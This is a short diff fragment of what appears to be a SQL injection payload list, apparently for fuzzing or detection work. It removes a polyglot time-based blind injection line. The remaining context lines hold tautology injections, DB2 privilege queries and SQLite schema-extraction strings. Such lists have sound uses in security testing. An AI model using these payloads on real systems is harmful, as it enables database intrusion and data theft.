@@ -404,7 +404,6 @@ s?{s: select * from users where id=1 or "]{" or 1=1 -- 1
 s\c: select * from users where id=1 or "\#" or 1=1 -- 1
 select * from syscat.dbauth where grantee = current user;
 select * from syscat.tabauth where grantee = current user;
-select 1,2,if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1))/*'xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),sleep(1)))or'|"xor(if(substr(@@version,1,1)<5,benchmark(2000000,sha1(0xde7ec71f1)),​sleep(1)))or"*/ from some_table where ex = ample
 select name from syscolumns where id = (sele ...
 select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"text",''),"integer",''),"autoincrement",''),"primary key",''),"unique",''),"numeric",''),"real",''),"blob",''),"not null",''),",",'~~') from sqlite_master where type!='meta' and sql not null and name not like 'sqlite_%' and name ='table_name'
 select sql from sqlite_master where type!='meta' and sql not null and name ='table_name'
